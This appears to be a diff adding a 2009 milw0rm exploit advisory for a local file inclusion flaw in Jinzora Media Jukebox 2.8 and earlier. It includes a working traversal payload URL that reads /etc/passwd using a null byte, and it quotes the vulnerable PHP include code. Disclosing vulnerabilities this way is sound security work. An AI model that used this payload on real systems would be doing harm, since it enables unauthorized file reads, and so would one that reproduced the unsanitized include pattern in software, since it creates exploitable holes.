@@ -1,0 +1,49 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ##########################################################################
+ #  [ Jinzora Media Jukebox <= 2.8 ]  Local File Inclusion Vulnerability  #
+ ##########################################################################
+ #
+ # Script site: http://jinzora.com/ ,  http://sourceforge.net/projects/jinzora/ 
+ # Download: http://downloads.sourceforge.net/jinzora/jz280.tar.gz?use_mirror=freefr
+ #
+ # Vuln: http://site.com/jinzora2/index.php?op=1&name=../../../../../../etc/passwd%00
+ #      
+ # Bug: ./jinzora2/index.php (lines: 36-47, 95)
+ #
+ # ...
+ #	$include_path = ""; $link_root = ""; $cms_type = "standalone"; $cms_mode = "false";
+ # $backend = ""; $jz_lang_file = ""; $skin = ""; $my_frontend = "";
+ #
+ #	if (isset($_GET['op'])){							// (1)
+ #		// This has got to be postnuke...
+ #		$include_path = "modules/". $_GET['name']. "/";				// (2)
+ #		$link_root = "modules.php?";
+ #		$cms_type = "postnuke";
+ #		$cms_mode = "true";
+ #	} else if (isset($_GET['name']) and !isset($_GET['op'])){
+ #		// This has got to be phpnuke
+ #		$include_path = "modules/". $_GET['name']. "/";
+ # ... 	 
+ #
+ # 	@include($include_path. 'settings.php'); 					// (3) LFI
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: mama * tata * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2009 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2009-03-24]
